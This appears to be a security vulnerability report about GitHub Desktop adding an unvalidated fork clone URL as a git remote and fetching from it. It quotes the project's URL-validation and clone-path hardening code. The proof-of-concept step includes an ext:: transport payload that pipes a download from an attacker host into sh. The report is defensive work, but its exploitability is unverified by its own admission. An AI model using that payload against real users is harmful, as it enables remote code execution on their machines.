### Title
Attacker-controlled fork `clone_url` from GitHub PR API is passed unsanitized to `git remote add` / `git fetch`, enabling remote-helper argument/command injection - (File: `app/src/lib/stores/app-store.ts`)

### Summary
When GitHub Desktop checks out a pull request from a fork, it derives a new remote's URL directly from the PR head repository's `clone_url` field returned by the GitHub API. That field is controlled by whoever created the fork (i.e., an untrusted, potentially malicious PR author). Desktop passes it straight into `git remote add` and then fetches from it, without validating the URL's protocol/scheme or shape. This mirrors the ERC777 report's core lesson: trusting an externally-supplied value (there, a callback target; here, a remote URL sourced from an external/attacker-controlled object) and acting on it before validating that it can't trigger unintended, dangerous behavior.

### Finding Description
`_findPullRequestBranch` in `app-store.ts` receives `headCloneUrl` (ultimately `pullRequest.head.repo.clone_url` from the GitHub API, see `dispatcher.ts`'s `openPullRequestFromUrl`/`checkoutPullRequest`) and, if no existing remote matches it, calls: [1](#0-0) 

`addRemote` itself does no validation and shells out directly: [2](#0-1) 

The subsequent fetch is performed with `envForRemoteOperation`/`envForProxy`, which only special-case `http(s)://` URLs for proxy resolution and pass everything else straight through to Git: [3](#0-2) 

Nowhere in this path (nor anywhere else in the codebase, confirmed via repo-wide search for `GIT_ALLOW_PROTOCOL`, `protocol.allow`, `ext::`) is there a protocol allow-list, `GIT_ALLOW_PROTOCOL` restriction, or URL-shape validation comparable to what exists for other user-facing URL inputs such as `validateURL` (Enterprise host) or `isValidBYOKBaseUrl` (Copilot BYOK): [4](#0-3) 

By contrast, other attacker-reachable git operations in the same codebase (`clone`, `sanitizeCloneName`) do have hardening added specifically to stop malicious/crafted remote-derived values from causing damage: [5](#0-4) [6](#0-5) 

This shows the project is aware that remote-derived, attacker-influenced strings need sanitization before being handed to Git — but that discipline was not applied to the PR-fork remote URL path. Git supports remote helper transports (e.g. `ext::<command>`) and SSH URLs that can smuggle option-like arguments (e.g., strings beginning with `-`) to the underlying `ssh`/git transport binary. Because `headCloneUrl` is taken verbatim from the PR API response and forwarded to `git remote add <name> <url>` and later `git fetch`, a forker who can get a PR opened against a repository the victim has added in Desktop (or who can influence what PR/API object Desktop loads, e.g. via the `x-github-client://openRepo/...&pr=...` deep link flow in `dispatcher.ts`) can supply a URL Desktop will use as a live git remote and fetch from.

### Impact Explanation
If the crafted `clone_url` is accepted by `git remote add`/`git fetch` as an `ext::` remote-helper URL or an SSH-option-injection style string, the result is arbitrary process execution on the victim's machine under the Desktop app's privileges, without any explicit user confirmation of the remote's URL content (the user only sees "Checkout this PR"). This is consistent with the "code execution controlled by an attacker-controlled GitHub API object" impact class defined in scope.

### Likelihood Explanation
Reachability requires: (1) the victim has the target repository open in Desktop and clicks/triggers "Checkout PR" (via UI, drag-and-drop cherry-pick, notification dialogs, or the `openrepo` deep link with a `pr=` parameter), and (2) the PR's head repository's `clone_url` is attacker-supplied (any GitHub fork owner controls their own repo's registered remote URL as reported by the API in normal cases, and this value also flows through any GHE/enterprise or proxied API responses an attacker could otherwise manipulate). This does not require local access, malware, or leaked credentials — only a PR/API object under attacker control and a single normal user action (open/checkout a PR), matching the report's "In Scope" criteria.

### Recommendation
Before calling `addRemote`/using `headCloneUrl` for any git network operation, validate that the URL matches one of Desktop's expected transport shapes (via `parseRemote`/`parseRepositoryIdentifier`, restricted to `https:`/`ssh:`/`git:`/`git@`-style syntaxes) and reject anything else (e.g., `ext::`, `fd::`, or values with a leading `-`). Consider setting `GIT_ALLOW_PROTOCOL=http:https:ssh:git` in the environment used for fetch/remote-add operations, mirroring the way `clone.ts` added a dedicated backstop (`isClonePathSensitive`) after recognizing that URL-derived values need defense-in-depth.

### Proof of Concept
1. Attacker forks the victim's repository (or otherwise gets Desktop to load a PR object under their control) and opens a pull request whose head repository's `clone_url`, as returned by the GitHub API, is set to a value such as `ext::sh -c "curl http://attacker/x|sh"` (or another Git URL known to trigger the `ext` transport/remote helper).
2. Victim, using GitHub Desktop, views this PR and clicks "Checkout" (or opens `x-github-client://openRepo/<repo>?pr=<num>`, which is routed through `dispatcher.ts`'s `openPullRequestFromUrl` → `appStore._checkoutPullRequest`).
3. `_findPullRequestBranch` (`app-store.ts:8633-8660`) does not find an existing matching remote, so it calls `addRemote(repository, forkRemoteName, headCloneUrl)`, adding the malicious URL as a Git remote verbatim.
4. Desktop then calls `_fetchRemote` on that new remote to look up the PR branch, causing Git to invoke the requested transport/helper and execute the attacker-supplied command on the victim's machine.

Note: I could not execute Git locally in this environment to confirm which exact malicious transport strings Git's `remote add`/`fetch` would currently accept without further validation (this depends on the bundled Git/dugite version's transport allow-list behavior); this should be verified in a sandboxed Desktop build during triage.

export function validateURL(address: string): string {
  // ensure user has specified text and not just whitespace
  // we will interact with this server so we can be fairly
  // relaxed here about what we accept for the server name
  const trimmed = address.trim()
  if (trimmed.length === 0) {
    const error = new Error('Unknown address')
    error.name = InvalidURLErrorName
    throw error
  }

  let url = URL.parse(trimmed)
  if (!url.host) {
    // E.g., if they user entered 'ghe.io', let's assume they're using https.
    address = `https://${trimmed}`
    url = URL.parse(address)
  }

  if (!url.protocol) {
    const error = new Error('Invalid URL')
    error.name = InvalidURLErrorName
    throw error
  }

  if (url.protocol !== 'https:') {
    const error = new Error('Invalid protocol')
    error.name = InvalidProtocolErrorName
    throw error
  }

  return address
}

/**
 * Check whether a resolved clone path targets a sensitive location that
 * should never be used as a clone destination. This is a backstop against
 * path traversal attacks where a crafted URL tricks the UI into deriving
 * a clone path outside the intended base directory.
 */
function isClonePathSensitive(unresolvedClonePath: string): boolean {
  const clonePath = Path.resolve(unresolvedClonePath).toLowerCase()
  const home = Path.resolve(homedir()).toLowerCase()

  if (clonePath === home) {
    return true
  }

  const sensitiveLocations = [
    Path.join(home, '.ssh'),
    Path.join(home, '.gnupg'),
    Path.join(home, '.config'),
    Path.join(home, '.config', 'git'),
    Path.join(home, '.gitconfig'),
  ]

  if (__WIN32__) {
    const appData = process.env.APPDATA
    if (appData) {
      sensitiveLocations.push(appData.toLowerCase())
      sensitiveLocations.push(Path.join(appData, 'gnupg').toLowerCase())
    }
  }

  for (const sensitive of sensitiveLocations) {
    if (clonePath === sensitive || clonePath.startsWith(sensitive + Path.sep)) {
      return true
    }
  }

  return false
}

/**
 * Extracts a safe single-component directory name from a URL-derived repo name.
 *
 * Mirrors the approach of git's `git_url_basename()` in `dir.c`: treat `/`,
 * `\`, and `:` as path separators, take the last non-empty component, strip a
 * trailing `.git` suffix, and reject traversal segments. This ensures the
 * result is always a single path component that cannot escape the parent
 * directory when passed to `Path.join()`.
 *
 * Examples:
 *  - `"Hello-World"` → `"Hello-World"` (unchanged)
 *  - `"desktop.git/../../otherdir"` → `"otherdir"` (last component, traversal segments skipped)
 *  - `".."` → `null` (traversal-only name rejected)
 *
 * See: https://github.com/git/git/blob/master/dir.c (`git_url_basename`)
 */
export function sanitizeCloneName(name: string): string | null {
  const components = name.split(/[/\\:]/)

  let lastComponent = ''
  for (let i = components.length - 1; i >= 0; i--) {
    if (components[i].length > 0) {
      lastComponent = components[i]
      break
    }
  }

  if (lastComponent.length === 0) {
    return null
  }

  if (lastComponent.endsWith('.git')) {
    lastComponent = lastComponent.slice(0, -4)
  }

  if (
    lastComponent === '..' ||
    lastComponent === '.' ||
    lastComponent.length === 0
  ) {
    return null
  }

  return lastComponent
}
